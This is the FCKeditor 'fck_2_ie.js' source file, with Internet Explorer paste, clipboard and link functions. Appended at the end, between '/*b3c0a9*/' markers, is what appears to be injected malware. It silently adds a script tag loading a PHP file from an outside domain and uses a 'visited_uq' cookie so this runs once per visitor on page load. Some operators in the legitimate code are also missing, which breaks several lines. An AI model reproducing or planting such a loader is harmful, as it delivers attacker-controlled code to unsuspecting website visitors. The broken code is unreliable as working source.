﻿/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fck_2_ie.js
 * 	This is the second part of the "FCK" object creation. This is the main
 * 	object that represents an editor instance.
 * 	(IE specific implementations)
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

/*
if ( FCKConfig.UseBROnCarriageReturn ) 
{
	// Named commands to be handled by this browsers specific implementation.
	FCK.RedirectNamedCommands = 
	{
		InsertOrderedList	: true,
		InsertUnorderedList	: true
	}

	FCK.ExecuteRedirectedNamedCommand = function( commandName, commandParameter )
	{
		if ( commandName == 'InsertOrderedList' || commandName == 'InsertUnorderedList' )
		{
			if ( !(FCK.EditorDocument.queryCommandState( 'InsertOrderedList' ) || FCK.EditorDocument.queryCommandState( 'InsertUnorderedList' )) )
			{
			}				
		}

		FCK.ExecuteNamedCommand( commandName, commandParameter ) ;
	}
}
*/

FCK.Paste = function()
{
	if ( FCKConfig.ForcePasteAsPlainText )
	{
		FCK.PasteAsPlainText() ;	
		return false ;
	}
	else if ( FCKConfig.AutoDetectPasteFromWord )
	{
		var sHTML = FCK.GetClipboardHTML() ;
		var re = /<\w[^>]*(( class="?MsoNormal"?)|(="mso-))/gi ;
		if ( re.test( sHTML ) )
		{
			if ( confirm( FCKLang["PasteWordConfirm"] ) )
			{
				FCK.PasteFromWord() ;
				return false ;
			}
		}
	}
	else
		return true ;
}

FCK.PasteAsPlainText = function()
{
	// Get the data available in the clipboard and encodes it in HTML.
	var sText = FCKTools.HTMLEncode( clipboardData.getData("Text") ) ;

	// Replace the carriage returns with <BR>
	sText = sText.replace( /\n/g, '<BR>' ) ;
	
	// Insert the resulting data in the editor.
	this.InsertHtml( sText ) ;	
}
/*
FCK.PasteFromWord = function()
{
	FCK.CleanAndPaste( FCK.GetClipboardHTML() ) ;
}
*/
FCK.InsertElement = function( element )
{
	FCK.InsertHtml( element.outerHTML ) ;
}

FCK.GetClipboardHTML = function()
{
	var oDiv = document.getElementById( '___FCKHiddenDiv' ) ;
	
	if ( !oDiv )
	{
		var oDiv = document.createElement( 'DIV' ) ;
		oDiv.id = '___FCKHiddenDiv' ;
		oDiv.style.visibility	= 'hidden' ;
		oDiv.style.overflow		= 'hidden' ;
		oDiv.style.position		= 'absolute' ;
		oDiv.style.width		= 1 ;
		oDiv.style.height		= 1 ;
	
		document.body.appendChild( oDiv ) ;
	}
	
	oDiv.innerHTML = '' ;
	
	var oTextRange = document.body.createTextRange() ;
	oTextRange.moveToElementText( oDiv ) ;
	oTextRange.execCommand( 'Paste' ) ;
	
	var sData = oDiv.innerHTML ;
	oDiv.innerHTML = '' ;
	
	return sData ;
}

FCK.AttachToOnSelectionChange = function( functionPointer )
{
	this.Events.AttachEvent( 'OnSelectionChange', functionPointer ) ;
}

/*
FCK.AttachToOnSelectionChange = function( functionPointer )
{
	FCK.EditorDocument.attachEvent( 'onselectionchange', functionPointer ) ;
}
*/

FCK.CreateLink = function( url )
{	
	FCK.ExecuteNamedCommand( 'Unlink' ) ;

	if ( url.length > 0 )
	{
		// Generate a temporary name for the link.
		var sTempUrl = 'javascript:void(0);/*'   ( new Date().getTime() )   '*/' ;
		
		// Use the internal "CreateLink" command to create the link.
		FCK.ExecuteNamedCommand( 'CreateLink', sTempUrl ) ;

		// Loof for the just create link.
		var oLinks = this.EditorDocument.links ;

		for ( i = 0 ; i < oLinks.length ; i   )
		{
			if ( oLinks[i].href == sTempUrl )
			{
				oLinks[i].href = url ;
				return oLinks[i] ;
			}
		}
	}
}


/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
